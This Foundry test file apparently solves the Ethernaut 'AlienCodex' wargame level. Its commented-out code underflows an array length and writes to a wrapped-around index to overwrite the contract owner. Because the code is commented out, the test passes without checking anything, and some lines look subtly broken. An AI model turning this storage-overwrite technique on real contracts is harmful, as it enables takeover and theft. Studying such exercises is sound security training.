// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/AlienCodex/AlienCodex.sol";
import "./utils/EthernautTest.sol";

contract AlienCodexTest is Test {
    function test_aliencodex() external {
        // // Setup
        // bytes memory bytecode = abi.encodePacked(vm.getCode("levels/AlienCodex/AlienCodexjson"));
        // address alienCodex;

        // assembly {
        //     alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        // }

        // // Exploit
        // vm.startPrank(tx.origin);

        // alienCodex.call(abi.encodeWithSignature("make_contract()"));
        // alienCodex.call(abi.encodeWithSignature("retract()"));

        // uint256 index0 = ((2 ** 256) - 1) - uint256(keccak256(abi.encodePacked(1))) + 1;

        // bytes32 myAddress = bytes32((tx.origin));

        // alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", index0, myAddress));

        // // Submit
        // (bool sucess, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));

        // // Convert hash to address
        // address ownerAddress = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        // vm.stopPrank();
        // assertEq(ownerAddress, tx.origin);
    }
}
